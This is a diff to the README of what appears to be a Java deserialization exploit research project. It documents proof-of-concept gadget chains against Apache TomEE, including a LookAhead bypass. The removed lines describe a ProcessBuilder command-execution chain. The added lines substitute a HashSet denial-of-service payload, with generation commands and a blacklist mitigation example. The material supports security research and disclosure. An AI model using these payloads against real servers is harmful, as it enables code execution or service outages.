@@ -31,23 +31,19 @@ Throws `OutOfMemoryError` when deserializingin doctored instances of various wel
 java -cp target/hackfest-2016.jar:target/lib/commons-io-2.5.jar:target/lib/javaee-api-6.0-6.jar:target/lib/openejb-core-4.7.4.jar:target/lib/openwebbeans-impl-1.2.7.jar:target/lib/openwebbeans-spi-1.2.7.jar:target/lib/serp-1.15.1.jar:target/lib/tomcat-juli-8.5.5.jar:target/lib/tomcat-tribes-8.5.5.jar com.salesforce.trust.s11n.exploit.JreOutOfMemory
 ```
 
-### POC for [CVE-2015-8581](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8581)
+### POC for Apache TomEE Denial of Service
 Class `com.salesforce.trust.s11n.exploit.TomeeLookAheadBypass`
 
-Generates a 'regular' gadget that can be used on older versions of [Apache TomEE](http://tomee.apache.org/apache-tomee.html) (before LookAhead validation was added, 1.7.3 or older)
+Generates a 'regular' DOS gadget that can be used on older versions of [Apache TomEE](http://tomee.apache.org/apache-tomee.html) (before LookAhead validation was added, 1.7.3 or older)
 #### Gadget chain: 
 ```
 ObjectInputStream.readObject() 
-  Throwable.readObject()
-    List.isEmpty()
-      (Proxy) EventHandler.invoke()
-        Method.invoke()
-          ProcessBuilder.start()
+  HashSet.readObject()
 ```
 #### Usage:
-Generate a binary file containing an OS command injection for `/usr/bin/gnome-calculator`:
+Generate a binary file containing a DOS payload:
 ```bash
-java -cp target/hackfest-2016.jar:target/lib/commons-io-2.5.jar:target/lib/javaee-api-6.0-6.jar:target/lib/openejb-core-4.7.4.jar:target/lib/openwebbeans-impl-1.2.7.jar:target/lib/openwebbeans-spi-1.2.7.jar:target/lib/serp-1.15.1.jar:target/lib/tomcat-juli-8.5.5.jar:target/lib/tomcat-tribes-8.5.5.jar com.salesforce.trust.s11n.exploit.TomeeLookAheadBypass regular /usr/bin/gnome-calculator
+java -cp target/hackfest-2016.jar:target/lib/commons-io-2.5.jar:target/lib/javaee-api-6.0-6.jar:target/lib/openejb-core-4.7.4.jar:target/lib/openwebbeans-impl-1.2.7.jar:target/lib/openwebbeans-spi-1.2.7.jar:target/lib/serp-1.15.1.jar:target/lib/tomcat-juli-8.5.5.jar:target/lib/tomcat-tribes-8.5.5.jar com.salesforce.trust.s11n.exploit.TomeeLookAheadBypass regular
 ```
 Send the file to the remote TomEE server:
 ```bash
@@ -66,27 +62,23 @@ tomee.serialization.class.blacklist = *
 
 To enable OpenEJB, we want to restrict the black list to known malicious classes, and we want to include our legitimate classes in the white list:
 ```
-tomee.serialization.class.blacklist = java.lang.ProcessBuilder
+tomee.serialization.class.blacklist = java.util.HashSet
 tomee.serialization.class.whitelist = bonhomme.Carnaval, java, org.apache
 ```
 
-This configuration provides an adequate mitigation against [CVE-2015-8581](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8581), however, it can be bypassed by this new gadget:
+This configuration provides an adequate mitigation against the DOS attack however, it can be bypassed by this new gadget:
 
 #### Gadget chain: 
 ```
 ObjectInputStream.readObject()
   EventImpl.readObject()
     OwbCustomObjectInputStream.readObject()
-      Throwable.readObject()
-        List.isEmpty()
-          (Proxy) EventHandler.invoke()
-            Method.invoke()
-              ProcessBuilder.start()
+      HashSet.readObject()
 ```
 #### Usage:
-Generate a binary file containing an OS command injection for `/usr/bin/gnome-calculator` (note the `bypass` flag):
+Generate a binary file containing a DOS payload (note the `bypass` flag):
 ```bash
-java -cp target/hackfest-2016.jar:target/lib/commons-io-2.5.jar:target/lib/javaee-api-6.0-6.jar:target/lib/openejb-core-4.7.4.jar:target/lib/openwebbeans-impl-1.2.7.jar:target/lib/openwebbeans-spi-1.2.7.jar:target/lib/serp-1.15.1.jar:target/lib/tomcat-juli-8.5.5.jar:target/lib/tomcat-tribes-8.5.5.jar com.salesforce.trust.s11n.exploit.TomeeLookAheadBypass bypass /usr/bin/gnome-calculator
+java -cp target/hackfest-2016.jar:target/lib/commons-io-2.5.jar:target/lib/javaee-api-6.0-6.jar:target/lib/openejb-core-4.7.4.jar:target/lib/openwebbeans-impl-1.2.7.jar:target/lib/openwebbeans-spi-1.2.7.jar:target/lib/serp-1.15.1.jar:target/lib/tomcat-juli-8.5.5.jar:target/lib/tomcat-tribes-8.5.5.jar com.salesforce.trust.s11n.exploit.TomeeLookAheadBypass bypass
 ```
 Send the file to the remote TomEE server:
 ```bash
